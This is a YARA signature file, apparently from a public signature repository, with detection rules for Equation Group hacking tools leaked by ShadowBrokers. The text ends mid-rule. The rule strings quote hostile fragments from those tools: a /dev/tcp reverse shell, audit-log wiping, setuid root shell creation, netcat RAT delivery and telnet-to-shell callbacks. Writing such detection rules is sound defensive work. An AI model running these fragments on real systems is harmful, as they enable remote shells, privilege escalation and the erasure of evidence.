
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-08
   Identifier: Equation Group hack tools leaked by ShadowBrokers

   Notice: Avoiding false positives is difficult with almost no antivirus
   coverage during the rule testing phase. Please report back false positives
   via https://github.com/Neo23x0/signature-base/issues
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_emptycriss {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file emptycriss"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91"
   strings:
      $s1 = "./emptycriss <target IP>" fullword ascii
      $s2 = "Cut and paste the following to the telnet prompt:" fullword ascii
      $s8 = "environ define TTYPROMPT abcdef" fullword ascii
   condition:
      ( filesize < 50KB and 1 of them )
}

rule EquationGroup_scripme {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scripme"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a"
   strings:
      $x1 = "running \\\"tcpdump -n -n\\\", on the environment variable \\$INTERFACE, scripted" fullword ascii
      $x2 = "Cannot read $opetc/scripme.override -- are you root?" ascii
      $x3 = "$ENV{EXPLOIT_SCRIPME}" ascii
      $x4 = "$opetc/scripme.override" ascii
   condition:
      ( filesize < 30KB and 1 of them )
}

rule EquationGroup_cryptTool {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2"
   strings:
      $s1 = "The encryption key is " fullword ascii
      $s2 = "___tempFile2.out" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_dumppoppy {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file dumppoppy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719"
   strings:
      $x1 = "Unless the -c (clobber) option is used, if two RETR commands of the" fullword ascii
      $x2 = "mywarn(\"End of $destfile determined by \\\"^Connection closed by foreign host\\\"\")" fullword ascii

      $l1 = "End of $destfile determined by \"^Connection closed by foreign host"
   condition:
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_Auditcleaner {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626"
   strings:
      $x1 = "> /var/log/audit/audit.log; rm -f ." ascii
      $x2 = "Pastables to run on target:" ascii
      $x3 = "cp /var/log/audit/audit.log .tmp" ascii

      $l1 = "Here is the first good cron session from" fullword ascii
      $l2 = "No need to clean LOGIN lines." fullword ascii
   condition:
      ( filesize < 300KB and 1 of them )
}

rule EquationGroup_reverse_shell {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826"
   strings:
      $s1 = "sh >/dev/tcp/" ascii
      $s2 = " <&1 2>&1" fullword ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_tnmunger {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2"
   strings:
      $s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
      $s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 10KB and 1 of them )
}

rule EquationGroup_ys_ratload {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75"
   strings:
      $x1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\"" fullword ascii
      $x2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $x3 = "CALLBACK_PORT=32177" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 3KB and 1 of them )
}

rule EquationGroup_eh_1_1_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628"
   strings:
      $x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
      $x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
      $x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and 1 of them )
}

rule EquationGroup_evolvingstrategy_1_0_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "fe70e16715992cc86bbef3e71240f55c7d73815b4247d7e866c845b970233c1b"
   strings:
      $s1 = "chown root sh; chmod 4777 sh;" fullword ascii
      $s2 = "cp /bin/sh .;chown root sh;" fullword ascii

      $l1 = "echo clean up when elevated:" fullword ascii

      $x1 = "EXE=$DIR/sbin/ey_vrupdate" fullword ascii
   condition:
      ( filesize < 4KB and 1 of them )
}

rule EquationGroup_toast_v3_2_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b"
   strings:
      $x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
      $s5 = "Roasting ->%s<- at ->%d:%d<-" fullword ascii
      $s6 = "rbnoil -Roasting ->" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_sshobo {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45"
   strings:
      $x1 = "Requested forwarding of port %d but user is not root." fullword ascii
      $x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
      $x3 = "~#  - list forwarded connections" fullword ascii
      $x4 = "packet_inject_ignore: block" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and all of them )
}

rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
   strings:
      $x1 = "result = self.send_command(\"ls -al %s\" % self.options.DIR)" fullword ascii
      $x2 = "cmd += \"D=-l%s \" % self.options.LISTEN_PORT" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 80KB and 1 of them )
}

rule EquationGroup_packrat {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file packrat"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf"
   strings:
      $x2 = "Use this on target to get your RAT:" fullword ascii
      $x3 = "$ratremotename && " fullword ascii
      $x5 = "$command = \"$nc$bindto -vv -l -p $port < ${ratremotename}\" ;" fullword ascii
   condition:
      ( filesize < 70KB and 1 of them )
}

rule EquationGroup_telex {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef"
   strings:
      $x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
      $x2 = "target is not vulnerable. exiting" fullword ascii
      $s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
      $s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_calserver {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file calserver"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "048625e9a0ca46d7fe221e262c8dd05e7a5339990ffae2fb65a9b0d705ad6099"
   strings:
      $x1 = "usage: %s <host> <port> e <contents of a local file to be executed on target>" fullword ascii
      $x2 = "Writing your %s to target." fullword ascii
      $x3 = "(e)xploit, (r)ead, (m)ove and then write, (w)rite" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_porkclient {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748"
   strings:
      $s1 = "-c COMMAND: shell command string" fullword ascii
      $s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
      $s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_electricslide {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014"
   strings:
      $x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
      $x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
      $x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
      $x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_libXmexploit2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d7ed0234d074266cb37dd6a6a60119adb7d75cc6cc3b38654c8951b643944796"
   strings:
      $s1 = "Usage: ./exp command display_to_return_to" fullword ascii
      $s2 = "sizeof shellcode = %d" fullword ascii
      $s3 = "Execve failed!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 40KB and 1 of them )
}

rule EquationGroup_wrap_telnet {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4"
   strings:
      $s1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\"" fullword ascii
      $s2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $s3 = "echo \"Call back port2 = ${SPORT}\"" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 4KB and 1 of them )
}

rule EquationGroup_elgingamble {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd"
   strings:
      $x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
      $x2 = "[-] kernel not vulnerable" fullword ascii
      $x3 = "[-] failed to spawn shell: %s" fullword ascii
      $x4 = "-s shell           Use shell instead of %s" fullword ascii
   condition:
      1 of them
}

rule EquationGroup_cmsd {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8"
   strings:
      $x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
      $x2 = "error: not vulnerable" fullword ascii

      $s1 = "port=%d connected! " fullword ascii
      $s2 = "xxx.XXXXXX" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_ebbshave {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eb5e0053299e087c87c2d5c6f90531cc1946019c85a43a2998c7b66a6f19ca4b"
   strings:
      $s1 = "executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s" fullword ascii
      $s2 = "./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772" fullword ascii
      $s3 = "version 1 - Start with option #18 first, if it fails then try this option" fullword ascii
      $s4 = "%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_eggbasket {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_jparsescan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jparsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
   strings:
      $s1 = "Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
      $s2 = "$gotsunos = ($line =~ /program version netid     address             service         owner/ );" fullword ascii
   condition:
      ( filesize < 40KB and 1 of them )
}

rule EquationGroup_sambal {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec"
   strings:
      $s1 = "+ Bruteforce mode." fullword ascii
      $s3 = "+ Host is not running samba!" fullword ascii
      $s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
      $s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
      $s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_pclean_v2_1_1_2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
   strings:
      $s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
      $s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 40KB and all of them )
}

rule EquationGroup_envisioncollision {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envisioncollision"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1"
   strings:
      $x1 = "mysql \\$D --host=\\$H --user=\\$U --password=\\\"\\$P\\\" -e \\\"select * from \\$T" fullword ascii
      $x2 = "Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\"sleep 500|nc" fullword ascii
      $s3 = "$ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");" fullword ascii
      $s4 = "$url = $host . \"/admin/index.php?adsess=\" . $enter . \"&app=core&module=applications&section=hooks&do=install_hook\";" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_cmsex {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810"
   strings:
      $x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
      $x2 = "-i target ip address / hostname " fullword ascii
      $x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
      $x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
      $x5 = "If one choice fails, you may want to try another." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_exze {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876"
   strings:
      $s1 = "shellFile" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "zeke_remove" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and all of them )
}

rule EquationGroup_porkserver {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkserver"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a"
   strings:
      $s1 = "%s/%s server failing (looping), service terminated" fullword ascii
      $s2 = "getpwnam: %s: No such user" fullword ascii
      $s3 = "execv %s: %m" fullword ascii
      $s4 = "%s/%s: unknown service" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and 3 of them )
}

rule EquationGroup_DUL {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e"
   strings:
      $x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
      $x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
}

rule EquationGroup_slugger2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf"
   strings:
      $x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
      $x2 = "command must be less than 61 chars" fullword ascii

      $s1 = "__rw_read_waiting" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "__mutexkind" fullword ascii
      $s4 = "__rw_pshared" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ($x*) ) ) or ( all of them )
}

rule EquationGroup_ebbisland {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbisland"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977"
   strings:
      $x1 = "Usage: %s [-V] -t <target_ip> -p port" fullword ascii
      $x2 = "error - shellcode not as expected - unable to fix up" fullword ascii
      $x3 = "WARNING - core wipe mode - this will leave a core file on target" fullword ascii
      $x4 = "[-C] wipe target core file (leaves less incriminating core on failed target)" fullword ascii
      $x5 = "-A <jumpAddr> (shellcode address)" fullword ascii
      $x6 = "*** Insane undocumented incremental port mode!!! ***" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_jackpop {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519"
   strings:
      $x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii

      $s1 = "client: can't bind to local address, are you root?" fullword ascii
      $s2 = "Unable to register port" fullword ascii
      $s3 = "Could not resolve destination" fullword ascii
      $s4 = "raw troubles" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
}

rule EquationGroup_parsescan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
   strings:
      $s1 = "$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\s+version/) or" fullword ascii
      $s2 = "Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_jscan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jscan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe"
   strings:
      $s1 = "$scanth = $scanth . \" -s \" . $scanthreads;" fullword ascii
      $s2 = "print \"java -jar jscanner.jar$scanth$list\\n\";" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_promptkill {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file promptkill"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d"
   strings:
      $x1 = "exec(\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\");" fullword ascii
      $x2 = "$xargs=\"-title \\\"Kill process $pid?\\\" -name \\\"Kill process $pid?\\\" -bg white -fg red -geometry 202x19+0+0\" ;" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_epoxyresin_v1_0_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73"
   strings:
      $x1 = "[-] kernel not vulnerable" fullword ascii

      $s1 = ".tmp.%d.XXXXXX" fullword ascii
      $s2 = "[-] couldn't create temp file" fullword ascii
      $s3 = "/boot/System.map-%s" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
}

rule EquationGroup_estopmoonlit {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "707ecc234ed07c16119644742ebf563b319b515bf57fd43b669d3791a1c5e220"
   strings:
      $x1 = "[+] shellcode prepared, re-executing" fullword ascii
      $x2 = "[-] kernel not vulnerable: prctl" fullword ascii
      $x3 = "[-] shell failed" fullword ascii
      $x4 = "[!] selinux apparently enforcing.  Continue [y|n]? " fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_envoytomato {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envoytomato"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5"
   strings:
      $s1 = "[-] kernel not vulnerable" fullword ascii
      $s2 = "[-] failed to spawn shell" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_smash {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file smash"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6"
   strings:
      $x1 = "T=<target IP> [O=<port>] Y=<target type>" fullword ascii
      $x2 = "no command given!! bailing..." fullword ascii
      $x3 = "no port. assuming 22..." fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ratload {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
   strings:
      $x1 = "/tmp/ratload.tmp.sh" fullword ascii
      $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
      $s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ys {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.auto"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15"
   strings:
      $x1 = "EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"" fullword ascii
      $x3 = "DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`" fullword ascii
      $x4 = "FATAL ERROR: -x port and -n port MUST NOT BE THE SAME." fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_ewok {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72"
   strings:
      $x1 = "Example: ewok -t target public" fullword ascii
      $x2 = "Usage:  cleaner host community fake_prog" fullword ascii
